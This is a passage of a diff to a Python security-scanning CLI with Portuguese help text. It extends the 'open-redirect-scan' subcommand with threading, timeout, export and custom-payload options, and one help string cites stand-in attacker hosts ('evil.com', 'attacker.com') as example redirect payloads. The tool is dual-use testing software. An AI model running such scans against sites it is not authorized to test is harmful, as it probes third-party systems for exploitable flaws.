     parser_ssrf = subparsers.add_parser('ssrf-scan', help='[Scan] Procura por falhas de Server-Side Request Forgery (SSRF).')
     parser_ssrf.add_argument('-u', '--url', required=True, help='URL base para iniciar a verificação.')
     
-    parser_redirect = subparsers.add_parser('open-redirect-scan', help='[Scan] Procura por falhas de Redirecionamento Aberto.')
+    parser_redirect = subparsers.add_parser('open-redirect-scan', help='[Scan] Scanner avançado de Open Redirect com 50+ payloads e múltiplas técnicas de detecção.')
     parser_redirect.add_argument('-u', '--url', required=True, help='URL base para iniciar a verificação.')
+    parser_redirect.add_argument('-t', '--timeout', type=int, default=10, help='Timeout para requisições em segundos (padrão: 10)')
+    parser_redirect.add_argument('--threads', type=int, default=5, help='Número de threads para processamento paralelo (padrão: 5, máx: 20)')
+    parser_redirect.add_argument('--export', action='store_true', help='Exportar resultados para arquivo JSON')
+    parser_redirect.add_argument('--verbose', action='store_true', help='Exibe informações detalhadas sobre payloads testados e detecções.')
+    parser_redirect.add_argument('--fast', action='store_true', help='Modo rápido: usa apenas payloads mais eficazes')
+    parser_redirect.add_argument('--custom-payloads', type=str, help='Payloads customizados separados por vírgula (ex: "http://evil.com,//attacker.com")')
+    parser_redirect.add_argument('--payload-file', type=str, help='Arquivo contendo payloads customizados (um por linha)')
+    parser_redirect.add_argument('--max-payloads', type=int, help='Limita número máximo de payloads a testar (padrão: todos)')
+    parser_redirect.add_argument('--follow-redirects', action='store_true', help='Seguir redirecionamentos HTTP automaticamente')
+    parser_redirect.add_argument('--session-pool-size', type=int, help='Tamanho do pool de sessões HTTP (padrão: baseado em threads)')
 
     parser_vuln = subparsers.add_parser('vuln-scan', help='[Scan] Executa uma verificação de configurações de segurança básicas.')
     parser_vuln.add_argument('-u', '--url', required=True, help='URL base do site para verificar.')
@@ -10960,7 +11568,24 @@ Para ajuda sobre um comando específico, use: python %(prog)s [comando] --help
     elif args.tool == 'ssrf-scan':
         ssrf_scan(args.url)
     elif args.tool == 'open-redirect-scan':
-        open_redirect_scan(args.url)
+        # Limitar threads para evitar sobrecarga
+        max_threads = min(args.threads, 20)
+        if args.threads > 20:
+            console.print(f"[yellow][!] Limitando threads de {args.threads} para 20 para evitar sobrecarga do sistema[/yellow]")
+        
+        open_redirect_scan(
+            args.url,
+            timeout=args.timeout,
+            threads=max_threads,
+            export_results=args.export,
+            verbose=args.verbose,
+            fast_mode=args.fast,
+            custom_payloads=args.custom_payloads,
+            payload_file=args.payload_file,
+            max_payloads=args.max_payloads,
+            follow_redirects=args.follow_redirects,
+            session_pool_size=args.session_pool_size
+        )
     elif args.tool == 'full-scan':
         full_scan(args.url, args.output, args.min_cvss, args.no_cache)
     elif args.tool == 'view':
